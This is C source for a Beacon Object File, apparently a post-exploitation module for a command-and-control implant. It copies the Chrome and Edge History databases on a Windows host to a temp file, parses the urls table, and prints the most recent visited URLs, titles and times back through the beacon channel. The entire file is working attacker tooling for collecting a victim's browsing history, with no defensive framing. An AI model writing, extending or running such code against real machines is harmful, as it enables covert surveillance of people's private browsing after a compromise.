/*
 * bof-browserhist [chrome|edge|all] [count]
 *
 * Read the most recent entries from Chrome / Edge `History` SQLite databases
 * (urls table) without the browser being closed.  The database is copied to
 * %TEMP% before it is parsed.
 *
 * count defaults to 50 (max 200).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "sqlite.h"

typedef struct {
    char url[512];
    char title[256];
    long long visits;
    long long when;
} hist_entry;

typedef struct {
    hist_entry e[200];
    int count;
} hist_ctx;

static void copy_val(bof_sqlite_value *v, char *out, int outsz)
{
    out[0] = 0;
    if (!v || v->type != 3 || v->len <= 0) return;
    if (v->len >= outsz) {
        bof_memcpy(out, v->text, (unsigned int)outsz - 1);
        out[outsz - 1] = 0;
    } else {
        bof_memcpy(out, v->text, (unsigned int)v->len);
        out[v->len] = 0;
    }
}

static int hist_row(void *ctx, int ncols, bof_sqlite_value *v)
{
    hist_ctx *h = (hist_ctx *)ctx;
    hist_entry ne;
    int i, worst = -1;

    if (ncols < 6) return 0;
    bof_memzero(&ne, sizeof(ne));
    copy_val(&v[1], ne.url, sizeof(ne.url));
    copy_val(&v[2], ne.title, sizeof(ne.title));
    if (!ne.url[0]) return 0;
    ne.visits = (v[3].type == 1) ? v[3].i : 0;
    ne.when   = (v[5].type == 1) ? v[5].i : 0;

    if (h->count < (int)(sizeof(h->e) / sizeof(h->e[0]))) {
        h->e[h->count++] = ne;
        return 0;
    }
    for (i = 0; i < h->count; i++) {
        if (worst < 0 || h->e[i].when < h->e[worst].when) worst = i;
    }
    if (worst >= 0 && ne.when > h->e[worst].when)
        h->e[worst] = ne;
    return 0;
}

static void dump_browser(const char *label, const char *dbpath, int limit)
{
    char tmp[MAX_PATH], db[MAX_PATH];
    bof_sqlite_db sdb;
    unsigned int root;
    hist_ctx ctx;
    int i, j;

    bof_strncpy(db, dbpath, sizeof(db));
    if (!db[0]) return;

    KERNEL32$GetTempPathA(sizeof(tmp), tmp);
    bof_strncat(tmp, "bof_history.db", sizeof(tmp) - bof_strlen(tmp) - 1);
    KERNEL32$DeleteFileA(tmp);

    if (!KERNEL32$CopyFileA(db, tmp, FALSE) && bof_sqlite_open(&sdb, db) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s: history not found ===\n", label);
        return;
    }
    if (KERNEL32$GetFileAttributesA(tmp) != INVALID_FILE_ATTRIBUTES) {
        if (bof_sqlite_open(&sdb, tmp) != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s: not a SQLite database ===\n", label);
            KERNEL32$DeleteFileA(tmp);
            return;
        }
    }

    root = bof_sqlite_table_root(&sdb, "urls");
    if (!root) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s: no urls table ===\n", label);
        bof_sqlite_close(&sdb);
        KERNEL32$DeleteFileA(tmp);
        return;
    }

    bof_memzero(&ctx, sizeof(ctx));
    bof_sqlite_scan(&sdb, root, hist_row, &ctx);

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s: %d url(s) ===\n", label, ctx.count);

    /* selection sort, newest first */
    for (i = 0; i < ctx.count; i++) {
        for (j = i + 1; j < ctx.count; j++) {
            if (ctx.e[j].when > ctx.e[i].when) {
                hist_entry t = ctx.e[i];
                ctx.e[i] = ctx.e[j];
                ctx.e[j] = t;
            }
        }
    }

    for (i = 0; i < ctx.count && i < limit; i++) {
        char when[32];
        bof_ft_str((unsigned long long)ctx.e[i].when * 10ULL, when, sizeof(when));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s  %s\n", when,
                     ctx.e[i].title[0] ? ctx.e[i].title : "(no title)");
        BeaconPrintf(CALLBACK_OUTPUT, "      %s\n", ctx.e[i].url);
    }

    bof_sqlite_close(&sdb);
    KERNEL32$DeleteFileA(tmp);
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "";
    int mlen = 0, limit = 50;
    char path[MAX_PATH];
    int do_chrome, do_edge;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    {
        int v = BeaconDataInt(&parser);
        if (v > 0 && v <= 200) limit = v;
    }
    if (!mode) mode = "";

    do_chrome = (!mode[0] || bof_stricmp(mode, "chrome") == 0 ||
                 bof_stricmp(mode, "all") == 0);
    do_edge   = (!mode[0] || bof_stricmp(mode, "edge") == 0 ||
                 bof_stricmp(mode, "all") == 0);

    if (do_chrome &&
        KERNEL32$ExpandEnvironmentStringsA(
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History",
            path, sizeof(path)))
        dump_browser("Chrome", path, limit);

    if (do_edge &&
        KERNEL32$ExpandEnvironmentStringsA(
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History",
            path, sizeof(path)))
        dump_browser("Edge", path, limit);
}
